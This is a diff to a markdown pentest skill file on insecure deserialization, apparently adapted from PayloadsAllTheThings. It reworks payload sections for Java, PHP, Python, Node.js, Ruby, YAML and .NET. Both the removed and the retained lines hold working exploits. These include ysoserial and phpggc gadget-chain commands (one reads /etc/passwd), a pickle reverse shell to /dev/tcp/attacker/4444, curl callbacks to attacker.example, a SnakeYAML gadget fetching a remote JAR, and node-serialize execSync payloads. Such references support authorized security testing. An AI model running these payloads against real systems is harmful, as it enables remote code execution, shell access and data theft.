@@ -1,5 +1,5 @@
 ---
-description: Java (ysoserial), PHP, Python (pickle), Node.js, .NET
+description: Detection signatures, .NET (ysoserial.net, Json.NET, ViewState), PHP phpggc output and phar, PyYAML/Psych/SnakeYAML gadgets, Ruby Marshal, node-serialize
 skill: deserialization-testing
 source: PayloadsAllTheThings — Insecure Deserialization
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -20,80 +20,9 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 | .NET     | —         | `AAEAAAD`     |
 | Ruby     | `04 08`   | `BAgK`        |
 
-## Java (ysoserial)
-
-### Common Gadget Chains
-
-```bash
-# Commons Collections
-java -jar ysoserial.jar CommonsCollections1 'id' | base64
-
-# Commons Collections (various versions)
-java -jar ysoserial.jar CommonsCollections3 'whoami'
-java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.example/$(whoami)'
-java -jar ysoserial.jar CommonsCollections6 'ping -c 1 attacker.example'
-java -jar ysoserial.jar CommonsCollections7 'id'
-
-# Spring
-java -jar ysoserial.jar Spring1 'touch /tmp/pwned'
-
-# Hibernate
-java -jar ysoserial.jar Hibernate1 'id'
-
-# JBoss / JMX
-java -jar ysoserial.jar JRMPClient 'attacker.example:1099'
-
-# URLDNS (detection only, no RCE)
-java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net'
-```
-
-### Delivery via HTTP
-
-```bash
-# POST serialized object
-curl -X POST http://target/api \
-  -H "Content-Type: application/x-java-serialized-object" \
-  --data-binary @payload.ser
-
-# Via cookie (base64-encoded)
-curl http://target/ -H "Cookie: session=$(java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0)"
-```
-
-### Detection
-
-```bash
-# Use URLDNS gadget (works with any Java app, no library dependency)
-java -jar ysoserial.jar URLDNS 'http://xxxx.burpcollaborator.net' > detect.ser
-```
-
 ## PHP (unserialize)
 
-### Basic Object Injection
-
-```php
-O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"isAdmin";b:1;}
-```
-
-### Magic Methods Exploited
-
-```
-__wakeup()    — called on unserialize()
-__destruct()  — called when object is destroyed
-__toString()  — called when object is used as string
-__call()      — called on undefined method
-```
-
 ### RCE via POP Chain
-
-```php
-# phpggc — PHP Generic Gadget Chains
-phpggc Laravel/RCE1 system id
-phpggc Symfony/RCE4 exec 'id'
-phpggc Monolog/RCE1 exec 'id'
-phpggc Guzzle/RCE1 exec id
-phpggc Slim/RCE1 system id
-phpggc Yii/RCE1 exec id
-```
 
 ```bash
 # Generate base64 payload
@@ -111,36 +40,13 @@ phpggc Symfony/RCE4 exec 'cat /etc/passwd' -u
 phpggc Monolog/RCE1 exec id -p phar -o evil.phar
 ```
 
-## Python (pickle)
+## YAML Deserialization
 
-### Basic RCE
-
-```python
-import pickle
-import os
-import base64
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('id',))
-
-payload = base64.b64encode(pickle.dumps(Exploit()))
-print(payload.decode())
-```
-
-### Reverse Shell
-
-```python
-import pickle
-import os
-import base64
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',))
-
-print(base64.b64encode(pickle.dumps(Exploit())).decode())
-```
+- [ ] Ruby Psych `YAML.load()`:
+      `!!ruby/object:Gem::Installer\ni: x`
+- [ ] Java SnakeYAML:
+      `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]]`
+- [ ] .NET YamlDotNet: generally safe, but check custom type converters
 
 ### PyYAML RCE
 
@@ -158,15 +64,20 @@ print(base64.b64encode(pickle.dumps(Exploit())).decode())
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
 ```
 
-### Base64 Encoded
+- [ ] Identify `node-serialize`, `serialize-javascript`, or `funcster` usage
+- [ ] Check if `JSON.parse` input flows into `eval`, `Function()`, or `vm.runInContext`
 
-```javascript
-var serialize = require('node-serialize');
-var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}';
-var cookie = Buffer.from(serialize.serialize(payload)).toString('base64');
-```
+## Ruby
+
+- [ ] Identify `Marshal.load`, `YAML.load` (without `safe_load`), or `Oj.load` usage
+- [ ] Markers: `\x04\x08` (Marshal magic bytes)
+- [ ] Generate payloads via universal-rce-ruby or craft `Marshal.dump` with ERB template gadgets
+- [ ] Check Rails `cookies.signed` / `cookies.encrypted` for Marshal-based session stores
 
 ## .NET Deserialization
+
+- [ ] Identify formatter: BinaryFormatter, DataContractSerializer, Json.NET
+- [ ] Test TypeNameHandling in Json.NET: `"$type":` property injection
 
 ### ysoserial.net
 
@@ -202,14 +113,4 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties \
   --generator="GENERATOR" \
   --viewstateuserkey="USERKEY" \
   --isdebug
-```
-
-## Detection Checklist
-
-```
-1. Identify serialized data in cookies, parameters, headers
-2. Check Content-Type headers (application/x-java-serialized-object)
-3. Look for base64 patterns matching known signatures
-4. Test with URLDNS/DNS callback payloads first (safe detection)
-5. Enumerate available libraries for gadget chain selection
 ```
